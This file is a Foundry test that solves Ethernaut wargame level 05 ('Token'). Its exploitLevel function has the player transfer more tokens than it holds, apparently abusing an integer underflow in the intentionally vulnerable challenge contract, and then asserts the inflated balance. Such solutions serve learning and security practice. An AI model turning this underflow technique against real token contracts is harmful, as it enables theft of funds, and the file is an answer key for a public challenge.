// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Token} from "../../src/05/Token.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {TokenFactory} from "src/05/TokenFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract TokenTest is Test, BaseTest {
    Token public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new TokenFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Token(instance);
        emit log_named_uint("balance", instanceContract.balanceOf(msg.sender));
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);
        console.log(player);

        emit log_named_uint("balance", instanceContract.balanceOf(msg.sender));
        instanceContract.transfer(msg.sender, instanceContract.balanceOf(levelFactory));

        assert(instanceContract.balanceOf(msg.sender) > 20);
        emit log_named_uint("balance", instanceContract.balanceOf(msg.sender));

        vm.stopPrank();
    }
}
